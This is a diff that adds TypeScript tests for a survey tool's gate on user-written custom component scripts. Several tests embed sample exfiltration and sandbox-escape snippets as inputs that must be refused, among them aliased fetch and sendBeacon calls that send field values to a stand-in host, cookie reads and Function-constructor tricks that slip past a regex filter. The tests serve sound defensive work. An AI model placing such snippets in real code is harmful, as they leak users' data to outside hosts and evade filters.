@@ -105,3 +105,61 @@ test("gateSurveyScripts: a failing script is switched off with the verdict in it
   assert.equal(g.def.scripts[2], def.scripts[2], "a passing script is the same object");
   assert.equal(gateSurveyScripts(g.def).def.scripts[0]!.notes, g.def.scripts[0]!.notes, "the verdict is attached once");
 });
+
+/* S0b D2 — the component flavour (a Custom Component's customJs: roots el and api) */
+
+const compRefused = (code: string, re: RegExp) => {
+  const v = codeGate(code, "component");
+  assert.equal(v.ok, false, `expected a refusal for ${code}`);
+  assert.ok(v.errors.some((e) => re.test(e)), `${code} → ${v.errors.join(" | ")}`);
+};
+
+test("component gate: the three S4 bypasses of the regex check are refused", async () => {
+  const { exfiltrationProblems } = await import("./uxScriptGuard.js");
+  const alias = `const f = globalThis.fetch; f("https://x.example/?" + api.getValue());`;
+  const ctor = `const F = (() => {}).constructor; F("return 1")();`;
+  const beacon = `const n = navigator; n["send" + "Beacon"]("https://x.example", api.getValue());`;
+  // the regex check alone let each of these through (S4 §2 N) — it stays as a signal, the gate decides
+  for (const c of [alias, ctor, beacon]) assert.deepEqual(exfiltrationProblems(c), [], `regex still blind to ${c}`);
+  compRefused(alias, /globalThis is not available/);
+  compRefused(ctor, /constructor is not available/);
+  compRefused(beacon, /navigator is not available/);
+});
+
+test("component gate: escapes through the element and the page are refused", () => {
+  compRefused(`el.ownerDocument.defaultView.fetch("https://x.example")`, /ownerDocument is not available/);
+  compRefused(`el["owner" + "Document"]`, /computed property name built from strings/);
+  compRefused(`window.addEventListener("message", () => {})`, /window is not available/);
+  compRefused(`document.cookie`, /document is not available|cookie is not available/);
+  compRefused(`document.querySelector("form").submit()`, /document is not available/);
+  compRefused(`this["fetch"]("https://x.example")`, /computed access on this\[…\]/);
+  compRefused(`new Image().src = "https://x.example/?" + api.getValue();`, /Image is not available/);
+  compRefused(`location.href = "https://x.example"`, /location is not available/);
+  compRefused(`with (el) { textContent = "x"; }`, /with is not available/);
+  compRefused(`for (;;) el.textContent += "x";`, /needs braces/);
+});
+
+test("component gate: ordinary component code passes (DOM work on el, api, nodes made with document.createElement)", () => {
+  for (const code of [
+    "el.textContent = 'component';",
+    "el.querySelector('input').addEventListener('change', function (e) { api.setValue(e.target.value); });",
+    "const b = document.createElement('button'); b.textContent = 'Pick'; b.onclick = () => api.setValue(1); el.appendChild(b);",
+    "const v = api.getValue(); const items = el.querySelectorAll('[data-v]'); for (const it of items) { it.classList.toggle('on', it.dataset.v === String(v)); }",
+    "let n = 0; const tick = () => { n++; el.dataset.n = String(n); }; setTimeout(tick, 100);",
+    "const stars = [1, 2, 3, 4, 5]; stars.forEach((s) => { const x = document.createElement('span'); x.textContent = '★'; x.addEventListener('click', () => api.setValue(s)); el.append(x); });",
+  ]) assert.deepEqual(codeGate(code, "component").errors, [], code);
+});
+
+test("component gate: IM set_custom_code decides with the gate (the regex is only a signal)", async () => {
+  const { applySurveyActions } = await import("./surveyActions.js");
+  const def = SurveyDefinition.parse({
+    meta: { id: "s", code: "S", title: "t", version: "1" }, flow: [],
+    questions: [{ id: "q1", code: "Q1", variableName: "Q1", type: "custom_component", text: "Pick", customJs: "el.textContent = 'v1';" }],
+  });
+  const bad = applySurveyActions(def, [{ op: "set_custom_code", target: "Q1", js: `const f = globalThis.fetch; f("https://x.example/?" + api.getValue());` }] as never);
+  assert.equal(bad.results[0]!.ok, false);
+  assert.match(bad.errors.join(" "), /component script for Q1 was refused — globalThis is not available/);
+  const good = applySurveyActions(def, [{ op: "set_custom_code", target: "Q1", js: "el.textContent = 'v2';" }] as never);
+  assert.equal(good.results[0]!.ok, true, good.errors.join("; "));
+  assert.equal(good.def.questions[0]!.customJs, "el.textContent = 'v2';");
+});
